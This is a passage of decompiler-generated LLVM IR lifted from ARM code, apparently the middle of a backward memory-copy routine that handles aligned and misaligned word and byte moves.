  %v5_18660 = icmp slt i32 %v0_1865c, -8
  br i1 %v5_18660, label %bb143, label %dec_label_pc_18664

dec_label_pc_18664:                               ; preds = %dec_label_pc_1865c
  %v6_18664 = add i32 %v0_1865c, 4
  store i32 %v6_18664, i32* %r2.global-to-local, align 4
  %v8_18664 = sub i32 -5, %v0_1865c
  %v9_18664 = and i32 %v8_18664, %v2_1865c
  %v10_18664 = icmp slt i32 %v9_18664, 0
  store i1 %v10_18664, i1* %cpsr_v.global-to-local, align 1
  %v11_18664 = icmp slt i32 %v6_18664, 0
  store i1 %v11_18664, i1* %cpsr_n.global-to-local, align 1
  %v5_18668 = icmp slt i32 %v2_1865c, 4
  %v6_18668 = load i32, i32* @r1, align 4
  %v7_18668 = add i32 %v6_18668, -4
  %v8_18668 = inttoptr i32 %v7_18668 to i32*
  %v9_18668 = load i32, i32* %v8_18668, align 4
  store i32 %v9_18668, i32* %r3.global-to-local, align 4
  br i1 %v5_18668, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_18664
  store i32 %v7_18668, i32* @r1, align 4
  %v8_1866c = add i32 %v7_1866c, -4
  %v9_1866c = inttoptr i32 %v8_1866c to i32*
  store i32 %v9_18668, i32* %v9_1866c, align 4
  %v10_1866c = load i32, i32* %r0.global-to-local, align 4
  %v11_1866c = add i32 %v10_1866c, -4
  store i32 %v11_1866c, i32* %r0.global-to-local, align 4
  %v0_1867c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_18664
  %v10_18670 = add i32 %v6_18668, -8
  %v11_18670 = inttoptr i32 %v10_18670 to i32*
  %v12_18670 = load i32, i32* %v11_18670, align 4
  store i32 %v12_18670, i32* @ip, align 4
  store i32 %v10_18670, i32* @r1, align 4
  %v7_18674 = add i32 %v7_1866c, -8
  %v8_18674 = inttoptr i32 %v7_18674 to i32*
  store i32 %v9_18668, i32* %v8_18674, align 4
  %v10_18674 = add i32 %v7_1866c, -4
  %v11_18674 = inttoptr i32 %v10_18674 to i32*
  %v12_18674 = load i32, i32* @ip, align 4
  store i32 %v12_18674, i32* %v11_18674, align 4
  store i32 %v7_18674, i32* %r0.global-to-local, align 4
  %v6_18678 = load i32, i32* %r2.global-to-local, align 4
  %v7_18678 = add i32 %v6_18678, -4
  store i32 %v7_18678, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_1865c, %dec_label_pc_185ec, %dec_label_pc_18820, %dec_label_pc_187b4, %dec_label_pc_18748, %bb142
  %v2_18680 = phi i32 [ %v11_1866c, %.thread20 ], [ %v0_1871832, %.thread26 ], [ %v7_1866c, %dec_label_pc_1865c ], [ %v2_185f0, %dec_label_pc_185ec ], [ %v2_1868c65, %dec_label_pc_18820 ], [ %v2_1868c64, %dec_label_pc_187b4 ], [ %v2_1868c63, %dec_label_pc_18748 ], [ %v7_18674, %bb142 ]
  %v0_1867c = phi i32 [ %v0_1867c.pre, %.thread20 ], [ %v2_186c0, %.thread26 ], [ %v2_1865c, %dec_label_pc_1865c ], [ %v2_185f4, %dec_label_pc_185ec ], [ %v0_1867c61, %dec_label_pc_18820 ], [ %v0_1867c60, %dec_label_pc_187b4 ], [ %v0_1867c59, %dec_label_pc_18748 ], [ %v7_18678, %bb142 ]
  %v1_1867c = add i32 %v0_1867c, 4
  store i32 %v1_1867c, i32* @r2, align 4
  %v3_1867c = sub i32 0, %v0_1867c
  %v4_1867c = and i32 %v1_1867c, %v3_1867c
  %v5_1867c = icmp slt i32 %v4_1867c, 0
  store i1 %v5_1867c, i1* %cpsr_v.global-to-local, align 1
  %v6_1867c = icmp slt i32 %v1_1867c, 0
  store i1 %v6_1867c, i1* %cpsr_n.global-to-local, align 1
  %v7_1867c = icmp eq i32 %v1_1867c, 0
  store i1 %v7_1867c, i1* @cpsr_z, align 1
  br i1 %v7_1867c, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_18684 = add i32 %v0_1867c, 2
  %v3_18684 = sub i32 -3, %v0_1867c
  %v4_18684 = and i32 %v3_18684, %v1_1867c
  %v5_18684 = icmp slt i32 %v4_18684, 0
  store i1 %v5_18684, i1* %cpsr_v.global-to-local, align 1
  %v6_18684 = icmp slt i32 %v1_18684, 0
  store i1 %v6_18684, i1* %cpsr_n.global-to-local, align 1
  %v7_18684 = icmp eq i32 %v1_1867c, 2
  store i1 %v7_18684, i1* @cpsr_z, align 1
  %v0_18688 = load i32, i32* @r1, align 4
  %v1_18688 = add i32 %v0_18688, -1
  %v2_18688 = inttoptr i32 %v1_18688 to i8*
  %v3_18688 = load i8, i8* %v2_18688, align 1
  %v4_18688 = zext i8 %v3_18688 to i32
  store i32 %v4_18688, i32* %r3.global-to-local, align 4
  store i32 %v1_18688, i32* @r1, align 4
  %v3_1868c = add i32 %v2_18680, -1
  %v4_1868c = inttoptr i32 %v3_1868c to i8*
  store i8 %v3_18688, i8* %v4_1868c, align 1
  %v5_1868c = load i32, i32* %r0.global-to-local, align 4
  %v6_1868c = add i32 %v5_1868c, -1
  store i32 %v6_1868c, i32* %r0.global-to-local, align 4
  %v0_18690 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18690 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18690 = xor i1 %v0_18690, %v1_18690
  br i1 %v2_18690, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_18690 = load i32, i32* @r1, align 4
  %v4_18690 = add i32 %v3_18690, -1
  %v5_18690 = inttoptr i32 %v4_18690 to i8*
  %v6_18690 = load i8, i8* %v5_18690, align 1
  %v7_18690 = zext i8 %v6_18690 to i32
  store i32 %v7_18690, i32* %r3.global-to-local, align 4
  store i32 %v4_18690, i32* @r1, align 4
  %v6_18694 = add i32 %v5_1868c, -2
  %v7_18694 = inttoptr i32 %v6_18694 to i8*
  store i8 %v6_18690, i8* %v7_18694, align 1
  %v8_18694 = load i32, i32* %r0.global-to-local, align 4
  %v9_18694 = add i32 %v8_18694, -1
  store i32 %v9_18694, i32* %r0.global-to-local, align 4
  %v1_18698.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18698.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_1869c = phi i32 [ %v9_18694, %bb145 ], [ %v6_1868c, %bb144 ]
  %v2_1869c = phi i1 [ %v2_18698.pre, %bb145 ], [ %v1_18690, %bb144 ]
  %v1_1869c = phi i1 [ %v1_18698.pre, %bb145 ], [ %v0_18690, %bb144 ]
  %v0_18698 = load i1, i1* @cpsr_z, align 1
  %v3_18698 = xor i1 %v2_1869c, %v1_1869c
  %v4_18698 = or i1 %v0_18698, %v3_18698
  br i1 %v4_18698, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_18698 = load i32, i32* @r1, align 4
  %v6_18698 = add i32 %v5_18698, -1
  %v7_18698 = inttoptr i32 %v6_18698 to i8*
  %v8_18698 = load i8, i8* %v7_18698, align 1
  %v9_18698 = zext i8 %v8_18698 to i32
  store i32 %v9_18698, i32* %r3.global-to-local, align 4
  store i32 %v6_18698, i32* @r1, align 4
  %v8_1869c = add i32 %v7_1869c, -1
  %v9_1869c = inttoptr i32 %v8_1869c to i8*
  store i8 %v8_18698, i8* %v9_1869c, align 1
  %v10_1869c = load i32, i32* %r0.global-to-local, align 4
  %v11_1869c = add i32 %v10_1869c, -1
  store i32 %v11_1869c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_186a4:                               ; preds = %dec_label_pc_185fc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_186a4 = icmp eq i32 %v1_185fc, 1
  store i1 %v8_186a4, i1* %cpsr_n.global-to-local, align 1
  %v1_186a8 = add i32 %v2_185ec, -1
  %v2_186a8 = inttoptr i32 %v1_186a8 to i8*
  %v3_186a8 = load i8, i8* %v2_186a8, align 1
  %v4_186a8 = zext i8 %v3_186a8 to i32
  store i32 %v4_186a8, i32* %r3.global-to-local, align 4
  store i32 %v1_186a8, i32* @r1, align 4
  %v3_186ac = add i32 %v2_185f0, -1
  %v4_186ac = inttoptr i32 %v3_186ac to i8*
  store i8 %v3_186a8, i8* %v4_186ac, align 1
  %v5_186ac = load i32, i32* %r0.global-to-local, align 4
  %v6_186ac = add i32 %v5_186ac, -1
  store i32 %v6_186ac, i32* %r0.global-to-local, align 4
  br i1 %v8_186a4, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_186a4
  %v9_186a4 = icmp eq i32 %v1_185fc, 2
  %v6_186b0 = load i32, i32* @r1, align 4
  %v7_186b0 = add i32 %v6_186b0, -1
  %v8_186b0 = inttoptr i32 %v7_186b0 to i8*
  %v9_186b0 = load i8, i8* %v8_186b0, align 1
  %v10_186b0 = zext i8 %v9_186b0 to i32
  store i32 %v10_186b0, i32* %r3.global-to-local, align 4
  store i32 %v7_186b0, i32* @r1, align 4
  %v9_186b4 = add i32 %v5_186ac, -2
  %v10_186b4 = inttoptr i32 %v9_186b4 to i8*
  store i8 %v9_186b0, i8* %v10_186b4, align 1
  %v11_186b4 = load i32, i32* %r0.global-to-local, align 4
  %v12_186b4 = add i32 %v11_186b4, -1
  store i32 %v12_186b4, i32* %r0.global-to-local, align 4
  br i1 %v9_186a4, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_186b8 = load i32, i32* @r1, align 4
  %v9_186b8 = add i32 %v8_186b8, -1
  %v10_186b8 = inttoptr i32 %v9_186b8 to i8*
  %v11_186b8 = load i8, i8* %v10_186b8, align 1
  %v12_186b8 = zext i8 %v11_186b8 to i32
  store i32 %v12_186b8, i32* %r3.global-to-local, align 4
  store i32 %v9_186b8, i32* @r1, align 4
  %v11_186bc = add i32 %v11_186b4, -2
  %v12_186bc = inttoptr i32 %v11_186bc to i8*
  store i8 %v11_186b8, i8* %v12_186bc, align 1
  %v13_186bc = load i32, i32* %r0.global-to-local, align 4
  %v14_186bc = add i32 %v13_186bc, -1
  store i32 %v14_186bc, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_186a4, %bb148
  %v0_1871832 = phi i32 [ %v12_186b4, %bb147 ], [ %v6_186ac, %dec_label_pc_186a4 ], [ %v14_186bc, %bb148 ]
  %v0_186c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_186c0 = load i32, i32* @ip, align 4
  %v2_186c0 = sub i32 %v0_186c0, %v1_186c0
  store i32 %v2_186c0, i32* %r2.global-to-local, align 4
  %v4_186c0 = xor i32 %v1_186c0, %v0_186c0
  %v5_186c0 = xor i32 %v2_186c0, %v0_186c0
  %v6_186c0 = and i32 %v5_186c0, %v4_186c0
  %v7_186c0 = icmp slt i32 %v6_186c0, 0
  store i1 %v7_186c0, i1* %cpsr_v.global-to-local, align 1
  %v8_186c0 = icmp slt i32 %v2_186c0, 0
  store i1 %v8_186c0, i1* %cpsr_n.global-to-local, align 1
  %v5_186c4 = icmp slt i32 %v0_186c0, %v1_186c0
  br i1 %v5_186c4, label %bb143, label %dec_label_pc_186c8

dec_label_pc_186c8:                               ; preds = %.thread26
  %v0_186c8 = load i32, i32* @r1, align 4
  %v1_186c8 = urem i32 %v0_186c8, 4
  store i32 %v1_186c8, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_186c8 = icmp eq i32 %v1_186c8, 0
  br i1 %v2_186c8, label %dec_label_pc_1860c, label %dec_label_pc_186d0

dec_label_pc_186d0:                               ; preds = %dec_label_pc_18604, %dec_label_pc_186c8
  %v0_1871831 = phi i32 [ %v2_185f0, %dec_label_pc_18604 ], [ %v0_1871832, %dec_label_pc_186c8 ]
  %v0_187c4 = phi i32 [ %v2_185f4, %dec_label_pc_18604 ], [ %v2_186c0, %dec_label_pc_186c8 ]
  %v0_186d0 = phi i32 [ %v2_185ec, %dec_label_pc_18604 ], [ %v0_186c8, %dec_label_pc_186c8 ]
  %v0_186d8 = phi i32 [ %v1_18604, %dec_label_pc_18604 ], [ %v1_186c8, %dec_label_pc_186c8 ]
  %v1_186d0 = and i32 %v0_186d0, -4
  store i32 %v1_186d0, i32* %r1.global-to-local, align 4
  %v1_186d4 = inttoptr i32 %v1_186d0 to i32*
  %v2_186d4 = load i32, i32* %v1_186d4, align 4
  store i32 %v2_186d4, i32* %r3.global-to-local, align 4
  %v7_186d8 = icmp ult i32 %v0_186d8, 2
  %v2_187bc = add i32 %v0_187c4, -12
  %v4_187bc = sub i32 11, %v0_187c4
  %v5_187bc = and i32 %v4_187bc, %v0_187c4
  %v6_187bc = icmp slt i32 %v5_187bc, 0
  store i1 %v6_187bc, i1* %cpsr_v.global-to-local, align 1
  %v7_187bc = icmp slt i32 %v2_187bc, 0
  store i1 %v7_187bc, i1* %cpsr_n.global-to-local, align 1
  %v5_187c0 = icmp slt i32 %v0_187c4, 12
  br i1 %v7_186d8, label %dec_label_pc_187bc, label %dec_label_pc_186e0

dec_label_pc_186e0:                               ; preds = %dec_label_pc_186d0
  %v8_186d8 = icmp eq i32 %v0_186d8, 2
  br i1 %v8_186d8, label %dec_label_pc_18750, label %dec_label_pc_186e4

dec_label_pc_186e4:                               ; preds = %dec_label_pc_186e0
  br i1 %v5_187c0, label %dec_label_pc_18730, label %dec_label_pc_186ec

dec_label_pc_186ec:                               ; preds = %dec_label_pc_186e4
  store i32 %v2_187bc, i32* %r2.global-to-local, align 4
  %v3_186f0 = load i32, i32* @r4, align 4
  store i32 %v3_186f0, i32* %stack_var_-12, align 4
  %v6_186f0 = load i32, i32* @r5, align 4
  %v8_186f0 = inttoptr i32 %v6_186f0 to i8*
  store i8* %v8_186f0, i8** %stack_var_-8, align 4
  %v11_186f0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_186f4

dec_label_pc_186f4:                               ; preds = %dec_label_pc_186f4.dec_label_pc_186f4_crit_edge, %dec_label_pc_186ec
  %v0_18718 = phi i32 [ %v1_18718, %dec_label_pc_186f4.dec_label_pc_186f4_crit_edge ], [ %v0_1871831, %dec_label_pc_186ec ]
  %v0_186f8 = phi i32 [ %v0_186f8.pre, %dec_label_pc_186f4.dec_label_pc_186f4_crit_edge ], [ %v1_186d0, %dec_label_pc_186ec ]
  %v0_186f4 = phi i32 [ %v0_186f4.pre, %dec_label_pc_186f4.dec_label_pc_186f4_crit_edge ], [ %v2_186d4, %dec_label_pc_186ec ]
  %v3_186f4 = mul i32 %v0_186f4, 256
  store i32 %v3_186f4, i32* %lr.global-to-local, align 4
  %v1_186f8 = add i32 %v0_186f8, -4
  %v2_186f8 = inttoptr i32 %v1_186f8 to i32*
  %v3_186f8 = load i32, i32* %v2_186f8, align 4
  store i32 %v3_186f8, i32* %r3.global-to-local, align 4
  %v4_186f8 = add i32 %v0_186f8, -8
  %v5_186f8 = inttoptr i32 %v4_186f8 to i32*
  %v6_186f8 = load i32, i32* %v5_186f8, align 4
  store i32 %v6_186f8, i32* %r4.global-to-local, align 4
  %v7_186f8 = add i32 %v0_186f8, -12
  %v8_186f8 = inttoptr i32 %v7_186f8 to i32*
  %v9_186f8 = load i32, i32* %v8_186f8, align 4
  store i32 %v9_186f8, i32* %r5.global-to-local, align 4
  %v10_186f8 = add i32 %v0_186f8, -16
  %v11_186f8 = inttoptr i32 %v10_186f8 to i32*
  %v12_186f8 = load i32, i32* %v11_186f8, align 4
  store i32 %v10_186f8, i32* %r1.global-to-local, align 4
  %v4_186fc = udiv i32 %v12_186f8, 16777216
  %v5_186fc = or i32 %v4_186fc, %v3_186f4
  store i32 %v5_186fc, i32* %lr.global-to-local, align 4
  %v3_18700 = mul i32 %v12_186f8, 256
  %v4_18704 = udiv i32 %v9_186f8, 16777216
  %v5_18704 = or i32 %v3_18700, %v4_18704
  store i32 %v5_18704, i32* @ip, align 4
  %v3_18708 = mul i32 %v9_186f8, 256
  %v4_1870c = udiv i32 %v6_186f8, 16777216
  %v5_1870c = or i32 %v3_18708, %v4_1870c
  store i32 %v5_1870c, i32* %r5.global-to-local, align 4
  %v3_18710 = mul i32 %v6_186f8, 256
  %v4_18714 = udiv i32 %v3_186f8, 16777216
  %v5_18714 = or i32 %v3_18710, %v4_18714
  store i32 %v5_18714, i32* %r4.global-to-local, align 4
  %v1_18718 = add i32 %v0_18718, -16
  %v2_18718 = inttoptr i32 %v1_18718 to i32*
  store i32 %v5_18714, i32* %v2_18718, align 4
  %v4_18718 = add i32 %v0_18718, -12
  %v5_18718 = inttoptr i32 %v4_18718 to i32*
  %v6_18718 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18718, i32* %v5_18718, align 4
  %v7_18718 = add i32 %v0_18718, -8
  %v8_18718 = inttoptr i32 %v7_18718 to i32*
  %v9_18718 = load i32, i32* @ip, align 4
  store i32 %v9_18718, i32* %v8_18718, align 4
  %v10_18718 = add i32 %v0_18718, -4
  %v11_18718 = inttoptr i32 %v10_18718 to i32*
  %v12_18718 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18718, i32* %v11_18718, align 4
  store i32 %v1_18718, i32* %r0.global-to-local, align 4
  %v0_1871c = load i32, i32* %r2.global-to-local, align 4
  %v2_1871c = add i32 %v0_1871c, -16
  store i32 %v2_1871c, i32* %r2.global-to-local, align 4
  %v6_18720 = icmp slt i32 %v0_1871c, 16
  br i1 %v6_18720, label %dec_label_pc_18724, label %dec_label_pc_186f4.dec_label_pc_186f4_crit_edge

dec_label_pc_186f4.dec_label_pc_186f4_crit_edge:  ; preds = %dec_label_pc_186f4
  %v0_186f4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_186f8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_186f4

dec_label_pc_18724:                               ; preds = %dec_label_pc_186f4
  %v2_18724 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18724, i32* @r4, align 4
  %v5_18724 = load i8*, i8** %stack_var_-8, align 4
  %v6_18724 = ptrtoint i8* %v5_18724 to i32
  store i32 %v6_18724, i32* @r5, align 4
  store i32 %v11_186f0, i32* @lr, align 4
  %v2_18728 = add i32 %v0_1871c, -4
  store i32 %v2_18728, i32* %r2.global-to-local, align 4
  %v4_18728 = add i32 %v0_1871c, 2147483632
  %v5_18728 = and i32 %v2_18728, %v4_18728
  %v6_18728 = icmp slt i32 %v5_18728, 0
  store i1 %v6_18728, i1* %cpsr_v.global-to-local, align 1
  %v7_18728 = icmp slt i32 %v2_18728, 0
  store i1 %v7_18728, i1* %cpsr_n.global-to-local, align 1
  %v5_1872c = icmp slt i32 %v2_1871c, -12
  br i1 %v5_1872c, label %dec_label_pc_18748, label %dec_label_pc_18730

dec_label_pc_18730:                               ; preds = %dec_label_pc_18724, %dec_label_pc_186e4, %dec_label_pc_18730
  %v1_1873c = phi i32 [ %v5_1873c, %dec_label_pc_18730 ], [ %v1_18718, %dec_label_pc_18724 ], [ %v0_1871831, %dec_label_pc_186e4 ]
  %v0_18730 = load i32, i32* %r3.global-to-local, align 4
  %v3_18730 = mul i32 %v0_18730, 256
  store i32 %v3_18730, i32* %ip.global-to-local, align 4
  %v0_18734 = load i32, i32* %r1.global-to-local, align 4
  %v1_18734 = add i32 %v0_18734, -4
  %v2_18734 = inttoptr i32 %v1_18734 to i32*
  %v3_18734 = load i32, i32* %v2_18734, align 4
  store i32 %v3_18734, i32* %r3.global-to-local, align 4
  store i32 %v1_18734, i32* %r1.global-to-local, align 4
  %v4_18738 = udiv i32 %v3_18734, 16777216
  %v5_18738 = or i32 %v4_18738, %v3_18730
  store i32 %v5_18738, i32* @ip, align 4
  %v2_1873c = add i32 %v1_1873c, -4
  %v3_1873c = inttoptr i32 %v2_1873c to i32*
  store i32 %v5_18738, i32* %v3_1873c, align 4
  %v4_1873c = load i32, i32* %r0.global-to-local, align 4
  %v5_1873c = add i32 %v4_1873c, -4
  store i32 %v5_1873c, i32* %r0.global-to-local, align 4
  %v0_18740 = load i32, i32* %r2.global-to-local, align 4
  %v2_18740 = add i32 %v0_18740, -4
  store i32 %v2_18740, i32* %r2.global-to-local, align 4
  %v6_18744 = icmp slt i32 %v0_18740, 4
  br i1 %v6_18744, label %dec_label_pc_18748.loopexit, label %dec_label_pc_18730

dec_label_pc_18748.loopexit:                      ; preds = %dec_label_pc_18730
  %v4_18740 = sub i32 3, %v0_18740
  %v5_18740 = and i32 %v4_18740, %v0_18740
  %v6_18740 = icmp slt i32 %v5_18740, 0
  %v7_18740 = icmp slt i32 %v2_18740, 0
  store i1 %v6_18740, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18740, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18748

dec_label_pc_18748:                               ; preds = %dec_label_pc_18748.loopexit, %dec_label_pc_18724
  %v2_1868c63 = phi i32 [ %v5_1873c, %dec_label_pc_18748.loopexit ], [ %v1_18718, %dec_label_pc_18724 ]
  %v0_1867c59 = phi i32 [ %v2_18740, %dec_label_pc_18748.loopexit ], [ %v2_18728, %dec_label_pc_18724 ]
  %v0_18748 = load i32, i32* %r1.global-to-local, align 4
  %v1_18748 = add i32 %v0_18748, 3
  store i32 %v1_18748, i32* @r1, align 4
  br label %bb143

dec_label_pc_18750:                               ; preds = %dec_label_pc_186e0
  br i1 %v5_187c0, label %dec_label_pc_1879c, label %dec_label_pc_18758

dec_label_pc_18758:                               ; preds = %dec_label_pc_18750
  store i32 %v2_187bc, i32* %r2.global-to-local, align 4
  %v3_1875c = load i32, i32* @r4, align 4
  store i32 %v3_1875c, i32* %stack_var_-12, align 4
  %v6_1875c = load i32, i32* @r5, align 4
  %v8_1875c = inttoptr i32 %v6_1875c to i8*
  store i8* %v8_1875c, i8** %stack_var_-8, align 4
  %v11_1875c = load i32, i32* @lr, align 4
  br label %dec_label_pc_18760

dec_label_pc_18760:                               ; preds = %dec_label_pc_18760.dec_label_pc_18760_crit_edge, %dec_label_pc_18758
  %v0_18784 = phi i32 [ %v1_18784, %dec_label_pc_18760.dec_label_pc_18760_crit_edge ], [ %v0_1871831, %dec_label_pc_18758 ]
  %v0_18764 = phi i32 [ %v0_18764.pre, %dec_label_pc_18760.dec_label_pc_18760_crit_edge ], [ %v1_186d0, %dec_label_pc_18758 ]
  %v0_18760 = phi i32 [ %v0_18760.pre, %dec_label_pc_18760.dec_label_pc_18760_crit_edge ], [ %v2_186d4, %dec_label_pc_18758 ]
  %v3_18760 = mul i32 %v0_18760, 65536
  store i32 %v3_18760, i32* %lr.global-to-local, align 4
  %v1_18764 = add i32 %v0_18764, -4
  %v2_18764 = inttoptr i32 %v1_18764 to i32*
  %v3_18764 = load i32, i32* %v2_18764, align 4
  store i32 %v3_18764, i32* %r3.global-to-local, align 4
  %v4_18764 = add i32 %v0_18764, -8
  %v5_18764 = inttoptr i32 %v4_18764 to i32*
  %v6_18764 = load i32, i32* %v5_18764, align 4
  store i32 %v6_18764, i32* %r4.global-to-local, align 4
  %v7_18764 = add i32 %v0_18764, -12
  %v8_18764 = inttoptr i32 %v7_18764 to i32*
  %v9_18764 = load i32, i32* %v8_18764, align 4
  store i32 %v9_18764, i32* %r5.global-to-local, align 4
  %v10_18764 = add i32 %v0_18764, -16
  %v11_18764 = inttoptr i32 %v10_18764 to i32*
  %v12_18764 = load i32, i32* %v11_18764, align 4
  store i32 %v10_18764, i32* %r1.global-to-local, align 4
  %v4_18768 = udiv i32 %v12_18764, 65536
  %v5_18768 = or i32 %v4_18768, %v3_18760
  store i32 %v5_18768, i32* %lr.global-to-local, align 4
  %v3_1876c = mul i32 %v12_18764, 65536
  %v4_18770 = udiv i32 %v9_18764, 65536
  %v5_18770 = or i32 %v3_1876c, %v4_18770
  store i32 %v5_18770, i32* @ip, align 4
  %v3_18774 = mul i32 %v9_18764, 65536
  %v4_18778 = udiv i32 %v6_18764, 65536
  %v5_18778 = or i32 %v3_18774, %v4_18778
  store i32 %v5_18778, i32* %r5.global-to-local, align 4
  %v3_1877c = mul i32 %v6_18764, 65536
  %v4_18780 = udiv i32 %v3_18764, 65536
  %v5_18780 = or i32 %v3_1877c, %v4_18780
  store i32 %v5_18780, i32* %r4.global-to-local, align 4
  %v1_18784 = add i32 %v0_18784, -16
  %v2_18784 = inttoptr i32 %v1_18784 to i32*
  store i32 %v5_18780, i32* %v2_18784, align 4
  %v4_18784 = add i32 %v0_18784, -12
  %v5_18784 = inttoptr i32 %v4_18784 to i32*
  %v6_18784 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18784, i32* %v5_18784, align 4
  %v7_18784 = add i32 %v0_18784, -8
  %v8_18784 = inttoptr i32 %v7_18784 to i32*
  %v9_18784 = load i32, i32* @ip, align 4
  store i32 %v9_18784, i32* %v8_18784, align 4
  %v10_18784 = add i32 %v0_18784, -4
  %v11_18784 = inttoptr i32 %v10_18784 to i32*
  %v12_18784 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18784, i32* %v11_18784, align 4
  store i32 %v1_18784, i32* %r0.global-to-local, align 4
  %v0_18788 = load i32, i32* %r2.global-to-local, align 4
  %v2_18788 = add i32 %v0_18788, -16
  store i32 %v2_18788, i32* %r2.global-to-local, align 4
  %v6_1878c = icmp slt i32 %v0_18788, 16
  br i1 %v6_1878c, label %dec_label_pc_18790, label %dec_label_pc_18760.dec_label_pc_18760_crit_edge

dec_label_pc_18760.dec_label_pc_18760_crit_edge:  ; preds = %dec_label_pc_18760
  %v0_18760.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_18764.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18760

dec_label_pc_18790:                               ; preds = %dec_label_pc_18760
  %v2_18790 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18790, i32* @r4, align 4
  %v5_18790 = load i8*, i8** %stack_var_-8, align 4
  %v6_18790 = ptrtoint i8* %v5_18790 to i32
  store i32 %v6_18790, i32* @r5, align 4
  store i32 %v11_1875c, i32* @lr, align 4
  %v2_18794 = add i32 %v0_18788, -4
  store i32 %v2_18794, i32* %r2.global-to-local, align 4
  %v4_18794 = add i32 %v0_18788, 2147483632
  %v5_18794 = and i32 %v2_18794, %v4_18794
  %v6_18794 = icmp slt i32 %v5_18794, 0
  store i1 %v6_18794, i1* %cpsr_v.global-to-local, align 1
  %v7_18794 = icmp slt i32 %v2_18794, 0
  store i1 %v7_18794, i1* %cpsr_n.global-to-local, align 1
  %v5_18798 = icmp slt i32 %v2_18788, -12
  br i1 %v5_18798, label %dec_label_pc_187b4, label %dec_label_pc_1879c

dec_label_pc_1879c:                               ; preds = %dec_label_pc_18790, %dec_label_pc_18750, %dec_label_pc_1879c
  %v1_187a8 = phi i32 [ %v5_187a8, %dec_label_pc_1879c ], [ %v1_18784, %dec_label_pc_18790 ], [ %v0_1871831, %dec_label_pc_18750 ]
  %v0_1879c = load i32, i32* %r3.global-to-local, align 4
  %v3_1879c = mul i32 %v0_1879c, 65536
  store i32 %v3_1879c, i32* %ip.global-to-local, align 4
  %v0_187a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_187a0 = add i32 %v0_187a0, -4
  %v2_187a0 = inttoptr i32 %v1_187a0 to i32*
  %v3_187a0 = load i32, i32* %v2_187a0, align 4
  store i32 %v3_187a0, i32* %r3.global-to-local, align 4
  store i32 %v1_187a0, i32* %r1.global-to-local, align 4
  %v4_187a4 = udiv i32 %v3_187a0, 65536
  %v5_187a4 = or i32 %v4_187a4, %v3_1879c
  store i32 %v5_187a4, i32* @ip, align 4
  %v2_187a8 = add i32 %v1_187a8, -4
  %v3_187a8 = inttoptr i32 %v2_187a8 to i32*
  store i32 %v5_187a4, i32* %v3_187a8, align 4
  %v4_187a8 = load i32, i32* %r0.global-to-local, align 4
  %v5_187a8 = add i32 %v4_187a8, -4
  store i32 %v5_187a8, i32* %r0.global-to-local, align 4
  %v0_187ac = load i32, i32* %r2.global-to-local, align 4
  %v2_187ac = add i32 %v0_187ac, -4
  store i32 %v2_187ac, i32* %r2.global-to-local, align 4
  %v6_187b0 = icmp slt i32 %v0_187ac, 4
  br i1 %v6_187b0, label %dec_label_pc_187b4.loopexit, label %dec_label_pc_1879c

dec_label_pc_187b4.loopexit:                      ; preds = %dec_label_pc_1879c
  %v4_187ac = sub i32 3, %v0_187ac
  %v5_187ac = and i32 %v4_187ac, %v0_187ac
  %v6_187ac = icmp slt i32 %v5_187ac, 0
  %v7_187ac = icmp slt i32 %v2_187ac, 0
  store i1 %v6_187ac, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_187ac, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_187b4

dec_label_pc_187b4:                               ; preds = %dec_label_pc_187b4.loopexit, %dec_label_pc_18790
  %v2_1868c64 = phi i32 [ %v5_187a8, %dec_label_pc_187b4.loopexit ], [ %v1_18784, %dec_label_pc_18790 ]
  %v0_1867c60 = phi i32 [ %v2_187ac, %dec_label_pc_187b4.loopexit ], [ %v2_18794, %dec_label_pc_18790 ]
  %v0_187b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_187b4 = add i32 %v0_187b4, 2
  store i32 %v1_187b4, i32* @r1, align 4
  br label %bb143

dec_label_pc_187bc:                               ; preds = %dec_label_pc_186d0
  br i1 %v5_187c0, label %dec_label_pc_18808, label %dec_label_pc_187c4

dec_label_pc_187c4:                               ; preds = %dec_label_pc_187bc
  store i32 %v2_187bc, i32* %r2.global-to-local, align 4
  %v3_187c8 = load i32, i32* @r4, align 4
  store i32 %v3_187c8, i32* %stack_var_-12, align 4
  %v6_187c8 = load i32, i32* @r5, align 4
  %v8_187c8 = inttoptr i32 %v6_187c8 to i8*
  store i8* %v8_187c8, i8** %stack_var_-8, align 4
